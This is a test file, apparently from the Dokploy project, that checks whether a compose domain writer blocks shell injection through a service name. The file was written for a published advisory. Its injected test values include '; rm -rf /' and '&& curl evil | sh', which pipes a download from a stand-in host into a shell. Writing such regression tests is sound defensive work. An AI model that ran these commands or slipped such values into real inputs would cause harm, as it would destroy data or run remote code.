import { parse } from "shell-quote";
import { describe, expect, it, vi } from "vitest";

// writeDomainsToCompose reads the on-disk compose file; mock fs so the file
// "exists" but does not contain the attacker's service, forcing the error path
// whose message embeds the user-controlled serviceName.
vi.mock("node:fs", async (importOriginal) => {
	const actual = await importOriginal<typeof import("node:fs")>();
	return {
		...actual,
		existsSync: () => true,
		readFileSync: () => "services:\n  web:\n    image: nginx\n",
	};
});

import { writeDomainsToCompose } from "@dokploy/server/utils/docker/domain";

const baseCompose = {
	appName: "my-app",
	serverId: null,
	composeType: "docker-compose",
	sourceType: "raw",
	composePath: "docker-compose.yml",
	isolatedDeployment: false,
	randomize: false,
	suffix: "",
} as any;

const makeDomain = (serviceName: string) =>
	({
		host: "example.com",
		serviceName,
		https: false,
		uniqueConfigKey: 1,
		port: 3000,
	}) as any;

// If the returned shell fragment is safe, parse() yields only string tokens.
// A leaked operator ($(), backtick, ;, |, &&) shows up as an object token.
const leaksShellSyntax = (command: string, marker: string) =>
	parse(command).some(
		(t) => typeof t !== "string" && JSON.stringify(t).includes(marker),
	);

describe("writeDomainsToCompose error path (GHSA-xmmr serviceName injection)", () => {
	it("does not let a malicious serviceName inject shell operators", async () => {
		const result = await writeDomainsToCompose(baseCompose, [
			makeDomain("$(touch /tmp/pwned)"),
		]);

		// The service does not exist in the compose, so we hit the error branch.
		expect(result).toContain("Has occurred an error");
		// The payload text may appear inside the single-quoted echo argument, but
		// it must never parse as a shell operator ($(), backtick, ; …).
		expect(leaksShellSyntax(result, "touch")).toBe(false);
	});

	it("neutralizes backtick and semicolon payloads too", async () => {
		for (const payload of ["`id`", "; rm -rf /", "&& curl evil | sh"]) {
			const result = await writeDomainsToCompose(baseCompose, [
				makeDomain(`svc${payload}`),
			]);
			expect(leaksShellSyntax(result, "rm")).toBe(false);
			expect(leaksShellSyntax(result, "curl")).toBe(false);
			expect(leaksShellSyntax(result, "id")).toBe(false);
		}
	});
});
